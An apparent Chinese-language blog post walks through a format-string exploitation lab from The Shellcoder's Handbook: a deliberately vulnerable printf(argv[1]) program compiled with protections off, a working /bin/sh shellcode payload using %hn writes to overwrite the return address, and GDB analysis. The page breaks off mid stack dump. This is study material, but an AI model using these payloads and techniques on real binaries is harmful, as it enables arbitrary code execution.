<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/embpgp.github.io/function%20()%20%7B%0A%20%20%20%20%20%20for%20(var%20_len2%20=%20arguments.length,%20args%20=%20new%20Array(_len2),%20_key2%20=%200;%20_key2%20%3C%20_len2;%20_key2++)%20%7B%0A%20%20%20%20%20%20%20%20args%5B_key2%5D%20=%20arguments%5B_key2%5D;%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20return%20obj%5Bval%5D.apply(obj,%20args);%0A%20%20%20%20%7D">

<link rel="stylesheet" href="/embpgp.github.io/css/main.css">


<link rel="stylesheet" href="/embpgp.github.io/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"embpgp.github.io","root":"/embpgp.github.io/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="可参考资料不限于但包括:0day安全 软件漏洞分析技术https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;24489276逆向工程学习平台http:&#x2F;&#x2F;www.xfocus.net&#x2F;articles&#x2F;200103&#x2F;123.htmlhttp:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;74224.htmlhttp:&#x2F;&#x2F;nullablesecurity.blogspot.">
<meta property="og:type" content="article">
<meta property="og:title" content="fmt_exploit">
<meta property="og:url" content="https://embpgp.github.io/2017/01/07/fmt-exploit/index.html">
<meta property="og:site_name" content="rutk1t0r&#39;s blog">
<meta property="og:description" content="可参考资料不限于但包括:0day安全 软件漏洞分析技术https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;24489276逆向工程学习平台http:&#x2F;&#x2F;www.xfocus.net&#x2F;articles&#x2F;200103&#x2F;123.htmlhttp:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;74224.htmlhttp:&#x2F;&#x2F;nullablesecurity.blogspot.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://embpgp.github.io/images/The_shellcoders_handbook_ch04_fmt_use.png">
<meta property="og:image" content="https://embpgp.github.io/images/The_Shellcodes_Handbook_ch04_write_4_b.png">
<meta property="og:image" content="https://embpgp.github.io/images/The_Shellcodes_Handbook_ch04_successful.png">
<meta property="article:published_time" content="2017-01-07T10:38:48.000Z">
<meta property="article:modified_time" content="2025-03-11T12:14:38.966Z">
<meta property="article:author" content="rutk1t0r">
<meta property="article:tag" content="C&#x2F;C++">
<meta property="article:tag" content="exploit">
<meta property="article:tag" content="shellcode">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://embpgp.github.io/images/The_shellcoders_handbook_ch04_fmt_use.png">

<link rel="canonical" href="https://embpgp.github.io/2017/01/07/fmt-exploit/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>fmt_exploit | rutk1t0r's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/embpgp.github.io/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">rutk1t0r's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Developer and Researcher</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/embpgp.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/embpgp.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/embpgp.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">29</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/embpgp.github.io/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/embpgp.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">40</span></a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/embpgp.github.io/schedule/notes.html" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://embpgp.github.io/2017/01/07/fmt-exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/embpgp.github.io/images/avatar.png">
      <meta itemprop="name" content="rutk1t0r">
      <meta itemprop="description" content="gnireenigne 0x41414141 \xff\xe4\xcc">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rutk1t0r's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          fmt_exploit
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2017-01-07 18:38:48" itemprop="dateCreated datePublished" datetime="2017-01-07T18:38:48+08:00">2017-01-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-03-11 20:14:38" itemprop="dateModified" datetime="2025-03-11T20:14:38+08:00">2025-03-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/embpgp.github.io/categories/study/" itemprop="url" rel="index"><span itemprop="name">study</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/embpgp.github.io/categories/study/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>可参考资料不限于但包括:<br><a target="_blank" rel="noopener" href="http://bbs.pediy.com/">0day安全 软件漏洞分析技术</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/24489276">https://zhuanlan.zhihu.com/p/24489276</a><br><a target="_blank" rel="noopener" href="http://www.cis.syr.edu/~wedu/seed/">逆向工程学习平台</a><br><a target="_blank" rel="noopener" href="http://www.xfocus.net/articles/200103/123.html">http://www.xfocus.net/articles/200103/123.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/74224.html">http://www.freebuf.com/articles/system/74224.html</a><br><a target="_blank" rel="noopener" href="http://nullablesecurity.blogspot.co.uk/">http://nullablesecurity.blogspot.co.uk/</a><br><a target="_blank" rel="noopener" href="http://bbs.pediy.com/showthread.php?t=123602">Exploit 编写教程</a><br><a target="_blank" rel="noopener" href="https://github.com/shiyanlou/seedlab/blob/master/formatstring.md">https://github.com/shiyanlou/seedlab/blob/master/formatstring.md</a><br><a target="_blank" rel="noopener" href="http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf">http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf</a><br><a target="_blank" rel="noopener" href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X/ref=sr_1_1?ie=UTF8&qid=1483684023&sr=8-1&keywords=shellcoders+handbook">The Shellcoder’s Handbook</a></p>
<span id="more"></span>
<hr>
<h1 id="再说说fmt"><a href="#再说说fmt" class="headerlink" title="再说说fmt"></a>再说说fmt</h1><p>在之前一篇<a target="_blank" rel="noopener" href="http://www.rutk1t0r.org/2016/09/25/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%92%B8printf%E5%90%A7/">《一起来撸printf吧》</a>中分析了内核中printf(printk)的大体实现，即可以进行一些简单地调试输出，因此实现了基本的参数格式化包括%n。但是应用开发者一般都是使用的glibc提供的C运行时库。而其<a href="ftp://ftp.gnu.org/gnu/glibc/">实现</a>更为复杂，有兴趣的可以参考。微软貌似不太一样，没有实现诸如<code>%$n</code>中的<code>$</code>控制，当然也可以不需要<code>$</code>直接通过之前输入的字符控制。根据前文分析得知类似printf类的函数还有很多，最后大都调用vfprintf函数进一步解析参数，一般不检查参数的合法性而直接进行格式化，写入或读出。因此编译的时候gcc有时候会提示不安全的警告。下面是格式化字符串漏洞的危害:<br><img src="/images/The_shellcoders_handbook_ch04_fmt_use.png" alt="The_shellcoders_handbook_ch04_fmt_use.png"></p>
<h1 id="来个小实验"><a href="#来个小实验" class="headerlink" title="来个小实验"></a>来个小实验</h1><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OS 版本:4.4.0-58-generic <span class="comment">#79-Ubuntu SMP Tue Dec 20 12:12:31 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">gcc: gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4)</span><br><span class="line">libc: lrwxrwxrwx 1 root root 12 11月 17 06:51 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.23.so</span><br><span class="line">GNU bash，版本 4.3.46(1)-release (i686-pc-linux-gnu)</span><br></pre></td></tr></table></figure>
<h2 id="测试例程"><a href="#测试例程" class="headerlink" title="测试例程"></a>测试例程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ls</span><br><span class="line">ascii.c  dowu.c  exit.c  fmt  fmt.c  gen_upload_string.c  Makefile  test.txt</span><br><span class="line">pgp@Rutk1t0r:ch04$ cat fmt.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">/*I have changed the code,so <span class="built_in">let</span> it work*/</span><br><span class="line"></span><br><span class="line">/*In order to implement arbitrary address write I need some <span class="built_in">local</span> vars and strcpy them.*/</span><br><span class="line">/*But I don<span class="string">&#x27;t need overflow the stack*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main( int argc, char *argv[] )</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	char evil[128];</span></span><br><span class="line"><span class="string">	strcpy(evil, argv[1]);</span></span><br><span class="line"><span class="string">	printf( argv[1]);</span></span><br><span class="line"><span class="string">	return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ cat Makefile </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fmt: fmt.c</span></span><br><span class="line"><span class="string">	gcc -fno-stack-protector -z execstack -o fmt fmt.c </span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ps</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">28187 pts/13   00:00:00 bash</span></span><br><span class="line"><span class="string">29047 pts/13   00:00:00 ps</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ls</span></span><br><span class="line"><span class="string">ascii.c  dowu.c  exit.c  fmt  fmt.c  gen_upload_string.c  Makefile  test.txt</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ./fmt $&#x27;</span>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x9e\xf1\xff\xbf\x9c\xf1\xff\xbf%49119x%10<span class="variable">$hn</span>%12529x%11<span class="variable">$hn</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1����</span></span><br><span class="line"><span class="string">     Qh//shh/bin��̀�����������</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">										 bffff3b9 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                     To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span></span><br><span class="line"><span class="string">See &quot;man sudo_root&quot; for details.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ps</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">28187 pts/13   00:00:00 bash</span></span><br><span class="line"><span class="string">29051 pts/13   00:00:00 sh</span></span><br><span class="line"><span class="string">29277 pts/13   00:00:00 ps</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$</span></span><br></pre></td></tr></table></figure>

<h1 id="如何做成这个测试"><a href="#如何做成这个测试" class="headerlink" title="如何做成这个测试?"></a>如何做成这个测试?</h1><p>上面结果就像是’蹦’得一下就完成了，其中还有很多空白字符没有复制过来了。为了这个小测试可谓煞费苦心。首先要找到shellcode,其中表网最知名的莫过于Offensive团队维护的<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database</a>。这是个学习的好地方…为了更简单我直接用谷大神的shellcode，选择了一个执行<code>/bin/sh</code>的<a target="_blank" rel="noopener" href="https://github.com/embpgp/shellcoding/blob/master/linux/sh/push.c">shellcode</a>。后来出问题的时候还想换成类<code>/bin/nc</code>的反弹或者直连shellcode，无奈<code>-e</code>参数无法执行只好继续用<code>/bin/sh</code>。问题后续会说。</p>
<h2 id="测试程序为何要改"><a href="#测试程序为何要改" class="headerlink" title="测试程序为何要改?"></a>测试程序为何要改?</h2><p>我用的测试例程基于《The Shellcode’s Handbook》.其中的fmt.c就是ch04目录下的。为了gdb调试简单我干脆删掉了对argc的判断和信息提示，本想直接了当地用空壳<code>printf( argv[1] );</code>即可完成测试，到后来发现并不能。为什么？因为类似于printf的格式化字符串漏洞的本质在于对栈空间参数的解析。而我们如果仅仅是单纯读栈空间内存的话很容易，若要写任意内存的话则必须借助%n来实现，而%n也不是那么容易利用的。它仅仅是能够对本次printf的调用在%n之前输出的字符数目(在分析内核中printf的实现的时候可以看到是两个局部指针相减)。因此我认为书中所说写任意数据是得打个问号的。书中的例子连续覆盖地址4个字节，但是要考虑到我们想写的数据字节并非都是递增(递减)。我们仅仅能够通过增加后续字节来使得要写得数据越来越大，因此如果不能保证递增或者递减，那么刚刚写好的数据可能又会被覆盖，因此必须得精心构造。书中提到利用%hn仅仅写16位数据，没错，我就是用这个来实现的。但是如果某些版本的glibc不支持就没辙了。因此我将测试例程改为了在栈空间复制了我的exp，这样我就能够传入我想要写的地址，之后利用%n来将我想写的地址处的数据变为shellcode首地址，exp中我将改写main函数的返回地址。还有个<code>$</code>特性，利用它可以制定具体的参数被处理，这样可以减少exp的体积，便于调试。</p>
<p><img src="/images/The_Shellcodes_Handbook_ch04_write_4_b.png" alt="The_Shellcodes_Handbook_ch04_write_4_b.png"></p>
<h2 id="需要关闭的保护选项"><a href="#需要关闭的保护选项" class="headerlink" title="需要关闭的保护选项"></a>需要关闭的保护选项</h2><ul>
<li>-fno-stack-protector 是为了取消gs的cookie保护，攻防详情可以参考网络或者书籍。</li>
<li>-z execstack 是告诉链接器栈空间数据可以被执行。同上。</li>
<li>保证/proc/sys/kernel/randomize_va_space的值为0,以此关闭ASLR,同上。</li>
</ul>
<h2 id="开启GDB调试"><a href="#开启GDB调试" class="headerlink" title="开启GDB调试"></a>开启GDB调试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ gdb ./fmt </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i686-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from ./fmt...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x0804843b &lt;+0&gt;:	lea    0x4(%esp),%ecx</span><br><span class="line">   0x0804843f &lt;+4&gt;:	and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">   0x08048442 &lt;+7&gt;:	pushl  -0x4(%ecx)</span><br><span class="line">   0x08048445 &lt;+10&gt;:	push   %ebp</span><br><span class="line">   0x08048446 &lt;+11&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048448 &lt;+13&gt;:	push   %edi</span><br><span class="line">   0x08048449 &lt;+14&gt;:	push   %ebx</span><br><span class="line">   0x0804844a &lt;+15&gt;:	push   %ecx</span><br><span class="line">   0x0804844b &lt;+16&gt;:	sub    <span class="variable">$0x8c</span>,%esp</span><br><span class="line">   0x08048451 &lt;+22&gt;:	mov    %ecx,%ebx</span><br><span class="line">   0x08048453 &lt;+24&gt;:	lea    -0x98(%ebp),%edx</span><br><span class="line">   0x08048459 &lt;+30&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0804845e &lt;+35&gt;:	mov    <span class="variable">$0x20</span>,%ecx</span><br><span class="line">   0x08048463 &lt;+40&gt;:	mov    %edx,%edi</span><br><span class="line">   0x08048465 &lt;+42&gt;:	rep stos %eax,%es:(%edi)</span><br><span class="line">   0x08048467 &lt;+44&gt;:	mov    0x4(%ebx),%eax</span><br><span class="line">   0x0804846a &lt;+47&gt;:	add    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x0804846d &lt;+50&gt;:	mov    (%eax),%eax</span><br><span class="line">   0x0804846f &lt;+52&gt;:	sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line">   0x08048472 &lt;+55&gt;:	push   %eax</span><br><span class="line">   0x08048473 &lt;+56&gt;:	lea    -0x98(%ebp),%eax</span><br><span class="line">   0x08048479 &lt;+62&gt;:	push   %eax</span><br><span class="line">   0x0804847a &lt;+63&gt;:	call   0x8048310 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0804847f &lt;+68&gt;:	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">   0x08048482 &lt;+71&gt;:	mov    0x4(%ebx),%eax</span><br><span class="line">   0x08048485 &lt;+74&gt;:	add    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x08048488 &lt;+77&gt;:	mov    (%eax),%eax</span><br><span class="line">   0x0804848a &lt;+79&gt;:	sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line">   0x0804848d &lt;+82&gt;:	push   %eax</span><br><span class="line">   0x0804848e &lt;+83&gt;:	call   0x8048300 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048493 &lt;+88&gt;:	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x08048496 &lt;+91&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0804849b &lt;+96&gt;:	lea    -0xc(%ebp),%esp</span><br><span class="line">   0x0804849e &lt;+99&gt;:	pop    %ecx</span><br><span class="line">   0x0804849f &lt;+100&gt;:	pop    %ebx</span><br><span class="line">   0x080484a0 &lt;+101&gt;:	pop    %edi</span><br><span class="line">   0x080484a1 &lt;+102&gt;:	pop    %ebp</span><br><span class="line">   0x080484a2 &lt;+103&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">   0x080484a5 &lt;+106&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<ul>
<li><p>然后在下面三处地址下断点，为什么呢？第一处为刚刚执行完strcpy函数，从此处观察栈空间中我们输入的数据是否都正常地拷贝进来了，因此exp(包括shellcode)中若是含有\0坏字符将导致测试失败。当然也有很多<code>高深的技巧</code>来避免坏字符…第二处为printf函数刚刚执行完，我们可以看到返回地址是否被成功修改我们想要的地址。第三处为main函数快要返回了，此时的esp刚好指向返回地址，我们也可以查看是否正确，并且单步执行看程序执行流是否被导向到shellcode。</p>
</li>
<li><p>随后我们随便输入一个字符试试。经过对反汇编代码的认真分析以及对execve系统调用的大致理解可以知道下面的0xbfffff0e0处为evil首地址，因为有0x41414141。在地址0xbffff18c处为main函数的返回地址，继续往上为argc,等于2,正确。在网上则为argv的首地址，我们可以根据它继续分析argv[1]的地址是可以找到的。可以稍微参考<a target="_blank" rel="noopener" href="http://www.rutk1t0r.org/2016/12/30/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-0-11%E7%9A%84loader-execve/">这篇文章</a>中的截图参照分析。认真分析过反汇编代码可以知道esp进来的时候总需要16字节对齐，猜测这是gcc的需求，然后又重新把返回地址压栈一遍，因此根据这个特性我们可以在另外的调试场景中快速定位ret(表示main函数返回地址)。由于我们禁止了ASLR，因此每次这个ret值是固定的，在我的PC中测试为0xb7e1b637，我们就是要改写它，而它的地址为0xbffff18c。我们每次的exp长度如果不同，导致程序参数长度不同，会继续导致exec系统调用对参数处理后esp值不同，因此我们需要随机应变。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff224) at fmt.c:12</span><br><span class="line">12		strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff0d0:	0xbffff0e0	0xbffff3d7	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0e0:	0x41414141	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	